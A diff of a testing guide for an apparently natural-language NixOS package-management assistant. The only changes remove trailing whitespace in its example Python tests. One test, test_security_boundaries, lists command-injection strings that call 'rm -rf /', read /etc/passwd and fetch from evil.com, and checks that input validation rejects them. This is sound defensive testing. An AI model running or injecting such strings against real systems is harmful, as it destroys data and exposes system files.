@@ -71,7 +71,7 @@ from tests.test_utils import (
 class CommandExecutor:
     def __init__(self, backend=None):
         self.backend = backend or RealExecutionBackend()
-    
+
     def execute(self, command):
         return self.backend.execute(command)
 
@@ -96,7 +96,7 @@ async def test_api_request(api):
         'method': 'process_with_xai',
         'params': {'input': 'install firefox'}
     })
-    
+
     assert response['intent'] == 'install_package'
     assert response['xai_explanation']['confidence'] > 0.9
 ```
@@ -107,7 +107,7 @@ async def test_api_request(api):
 def test_learning_from_corrections():
     db = TestDatabase()
     learning = TestLearningEngine(db)
-    
+
     # First attempt with typo
     learning.learn_from_interaction('user1', {
         'input': 'instal firefox',
@@ -115,11 +115,11 @@ def test_learning_from_corrections():
         'success': True,
         'feedback': 'corrected: install'
     })
-    
+
     # System should learn the correction
     stats = db.get_learning_stats('user1')
     assert stats['success_rate'] == 1.0
-    
+
     # Check preference was recorded
     pref = db.get_preference('user1', 'preferred_packages')
     assert pref['value'] == 'firefox'
@@ -130,13 +130,13 @@ def test_learning_from_corrections():
 ```python
 def test_graceful_error_handling():
     backend = TestExecutionBackend()
-    
+
     # Simulate package not found
     result = backend.execute('nix-env', ['-iA', 'nixos.nonexistent'])
-    
+
     assert result.returncode == 1
     assert "not found" in result.stderr.decode()
-    
+
     # Verify user-friendly error
     response = format_error_for_user(result)
     assert "I couldn't find that package" in response
@@ -154,7 +154,7 @@ from tests.test_utils import performance_test
 def test_simple_command_performance():
     """All simple commands must complete in under 1 second."""
     nlp = TestNLPEngine()
-    
+
     for _ in range(100):  # Test consistency
         result = nlp.process("install firefox", persona="maya_adhd")
         assert result['processing_time'] < 0.1
@@ -166,9 +166,9 @@ def test_simple_command_performance():
 def test_memory_efficiency():
     """Ensure we stay within memory budget."""
     import tracemalloc
-    
+
     tracemalloc.start()
-    
+
     # Process many commands
     backend = TestBackendAPI()
     for i in range(1000):
@@ -176,10 +176,10 @@ def test_memory_efficiency():
             'method': 'process_with_xai',
             'params': {'input': f'install package{i}'}
         })
-    
+
     current, peak = tracemalloc.get_traced_memory()
     tracemalloc.stop()
-    
+
     assert peak < 300 * 1024 * 1024  # Under 300MB
 ```
 
@@ -192,22 +192,22 @@ def test_complete_user_journey():
     """Test from natural language to execution."""
     # Setup
     nlp = TestNLPEngine()
-    executor = TestExecutionBackend() 
+    executor = TestExecutionBackend()
     db = TestDatabase()
     learning = TestLearningEngine(db)
-    
+
     # User input
     user_input = "I need that Firefox thing"
-    
+
     # NLP processing
     intent = nlp.process(user_input, persona="grandma_rose")
     assert intent['intent'] == 'install'
     assert intent['package'] == 'firefox'
-    
+
     # Execution
     result = executor.execute('nix-env', ['-iA', 'nixos.firefox'])
     assert result.returncode == 0
-    
+
     # Learning
     learning.learn_from_interaction('grandma', {
         'input': user_input,
@@ -215,7 +215,7 @@ def test_complete_user_journey():
         'package': 'firefox',
         'success': True
     })
-    
+
     # Verify learning worked
     model = learning.get_user_model('grandma')
     assert model['skill_level'] == 'beginner'
@@ -229,13 +229,13 @@ def test_complete_user_journey():
 def test_security_boundaries():
     """Ensure all inputs are validated."""
     backend = TestExecutionBackend()
-    
+
     malicious_inputs = [
         "install firefox; rm -rf /",
         "install `cat /etc/passwd`",
         "install $(curl evil.com)",
     ]
-    
+
     for evil in malicious_inputs:
         # Should be caught before execution
         with pytest.raises(SecurityError):
@@ -266,13 +266,13 @@ def test_environment():
 def test_user_isolation():
     """Each user's data must be isolated."""
     db = TestDatabase()
-    
+
     # User 1 learns firefox preference
     db.record_preference('user1', 'browser', 'firefox')
-    
-    # User 2 learns chrome preference  
+
+    # User 2 learns chrome preference
     db.record_preference('user2', 'browser', 'chrome')
-    
+
     # Verify isolation
     assert db.get_preference('user1', 'browser')['value'] == 'firefox'
     assert db.get_preference('user2', 'browser')['value'] == 'chrome'
@@ -284,7 +284,7 @@ def test_user_isolation():
 def test_deterministic_corrections():
     """Corrections should be consistent."""
     nlp = TestNLPEngine()
-    
+
     # Same typo should always correct the same way
     for _ in range(10):
         result = nlp.process("instal fierfix")
@@ -303,7 +303,7 @@ def test_deterministic_corrections():
 def test_old_style():
     mock_exec = Mock()
     mock_exec.return_value = Mock(returncode=0, stdout=b"Done")
-    
+
     result = some_function(mock_exec)
     assert result == "success"
     mock_exec.assert_called_once()
@@ -313,10 +313,10 @@ def test_new_style():
     executor = TestExecutionBackend()
     # Configure deterministic behavior if needed
     executor.package_db['mypackage'] = {'version': '1.0'}
-    
+
     result = some_function(executor)
     assert result == "success"
-    
+
     # Verify actual behavior
     assert 'mypackage' in executor.installed_packages
     assert len(executor.commands_executed) == 1
